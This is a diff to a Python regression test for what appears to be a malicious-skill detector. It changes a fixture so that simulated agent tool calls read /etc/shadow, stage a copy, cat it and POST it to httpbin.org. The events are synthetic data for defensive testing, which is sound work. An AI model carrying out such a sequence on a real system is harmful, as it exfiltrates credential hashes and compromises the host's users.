@@ -126,20 +126,20 @@ class DynamicDecisionRegressionTests(unittest.TestCase):
         execution = _execution(
             skill_dir=DATASETS_ROOT / "malicious" / "malicious_indirect_exfil_temp_copy",
             file_events=[
-                FileEvent(timestamp="2026-01-01T00:00:01Z", path="/etc/passwd", action="read", raw="read"),
-                FileEvent(timestamp="2026-01-01T00:00:02Z", path="runtime_output/staged-passwd.txt", action="write", raw="write"),
-                FileEvent(timestamp="2026-01-01T00:00:03Z", path="runtime_output/staged-passwd.txt", action="read", raw="read"),
+                FileEvent(timestamp="2026-01-01T00:00:01Z", path="/etc/shadow", action="read", raw="read"),
+                FileEvent(timestamp="2026-01-01T00:00:02Z", path="runtime_output/staged-shadow.txt", action="write", raw="write"),
+                FileEvent(timestamp="2026-01-01T00:00:03Z", path="runtime_output/staged-shadow.txt", action="read", raw="read"),
             ],
             network_events=[
                 NetworkEvent(timestamp="2026-01-01T00:00:04Z", address="https://httpbin.org/post", action="connect", raw="connect"),
             ],
             process_events=[
-                ProcessEvent(timestamp="2026-01-01T00:00:03Z", action="execve", command="cat runtime_output/staged-passwd.txt", raw="execve"),
+                ProcessEvent(timestamp="2026-01-01T00:00:03Z", action="execve", command="cat runtime_output/staged-shadow.txt", raw="execve"),
             ],
             tool_calls=[
-                _tool_call("2026-01-01T00:00:00Z", "read_sensitive_source", "Read Sensitive Source", "read_file", {"path": "/etc/passwd"}),
-                _tool_call("2026-01-01T00:00:02Z", "write_stage", "Write Stage File", "write_file", {"path": "runtime_output/staged-passwd.txt"}),
-                _tool_call("2026-01-01T00:00:03Z", "read_stage", "Read Stage via Command", "run_command", {"shell": True, "command": "cat runtime_output/staged-passwd.txt"}),
+                _tool_call("2026-01-01T00:00:00Z", "read_sensitive_source", "Read Sensitive Source", "read_file", {"path": "/etc/shadow"}),
+                _tool_call("2026-01-01T00:00:02Z", "write_stage", "Write Stage File", "write_file", {"path": "runtime_output/staged-shadow.txt"}),
+                _tool_call("2026-01-01T00:00:03Z", "read_stage", "Read Stage via Command", "run_command", {"shell": True, "command": "cat runtime_output/staged-shadow.txt"}),
                 _tool_call("2026-01-01T00:00:04Z", "send_stage", "Send Stage", "http_request", {"method": "POST", "url": "https://httpbin.org/post"}),
             ],
         )
